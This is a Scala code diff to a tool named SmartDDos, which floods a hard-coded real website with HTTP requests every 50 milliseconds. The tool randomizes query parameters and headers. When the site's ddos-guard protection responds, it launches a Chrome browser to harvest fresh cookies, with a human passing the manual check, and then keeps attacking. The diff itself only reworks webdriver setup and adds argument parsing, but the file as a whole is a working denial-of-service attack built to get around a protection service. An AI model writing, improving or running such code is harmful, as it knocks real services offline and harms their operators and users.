@@ -6,18 +6,22 @@ import akka.http.scaladsl.model.{HttpRequest, HttpResponse, StatusCodes, headers
 import hi.Agents.getCustomClientAgent
 import hi.Test.randomQueryParam
 import org.openqa.selenium.chrome.ChromeDriver
+import org.rogach.scallop._
+import io.github.bonigarcia.wdm.WebDriverManager
 
 import scala.collection.mutable
 import scala.concurrent.{ExecutionContextExecutor, Future}
 
 object SmartDDos {
 
+  org.rogach.scallop.throwError.value = true
+
   var agent = getCustomClientAgent
 
   var cookieMap = scala.collection.mutable.HashMap.empty[String, String]
   cookieMap += ("" -> "")
 
-  def innerRequest(url: String, recursion: Boolean)(implicit system: ActorSystem, executionContext: ExecutionContextExecutor): Future[Unit] = {
+  def innerRequest(url: String, recursion: Boolean)(implicit system: ActorSystem, executionContext: ExecutionContextExecutor, webDriver: ChromeDriver): Future[Unit] = {
     val str = randomQueryParam(url)
 
     Http().singleRequest(HttpRequest(uri = str).withHeaders(
@@ -54,7 +58,7 @@ object SmartDDos {
           println(s"Запрос новых куков...")
 
           if(headers.exists(p => p.name() == "Server" && p.value() == "ddos-guard")) {
-            println(fetchCookies(url, cookieMap))
+            println(fetchCookies(url, cookieMap, webDriver))
 
             innerRequest(url, recursion = true)
           }
@@ -64,15 +68,9 @@ object SmartDDos {
     }
   }
 
-  implicit val webDriver: ChromeDriver = {
-    System.setProperty("webdriver.chrome.driver", "chromedriver")
-    System.setProperty("webdriver.chrome.silentOutput", "true")
-    new ChromeDriver()
-  }
-
   //download https://chromedriver.chromium.org/downloads
   //xattr -d com.apple.quarantine chromedriver
-  def fetchCookies(url: String, cookieMap: mutable.HashMap[String, String]) = {
+  def fetchCookies(url: String, cookieMap: mutable.HashMap[String, String], webDriver: ChromeDriver) = {
     webDriver.get(url)
 
     //ждать 20 с пока пользователь пройдет ручную проверку
@@ -87,14 +85,29 @@ object SmartDDos {
   val target = "https://xaknet.team/"
 
   def main(args: Array[String]): Unit = {
+    //val conf = new Conf(args)
+
     implicit val system: ActorSystem = ActorSystem()
     implicit val executionContext: ExecutionContextExecutor = system.dispatcher
 
-    println(fetchCookies(target, cookieMap))
+    WebDriverManager.chromedriver().setup()
+
+    implicit val webDriver: ChromeDriver = {
+      System.setProperty("webdriver.chrome.silentOutput", "true")
+      new ChromeDriver()
+    }
+
+    println(fetchCookies(target, cookieMap, webDriver))
 
     while (true) {
       innerRequest(target, false)
       Thread.sleep(50)
     }
   }
+
+/*  class Conf(arguments: Seq[String]) extends ScallopConf(arguments) {
+    val driver = opt[String](required = true)
+    val target = trailArg[String]()
+    verify()
+  }*/
 }
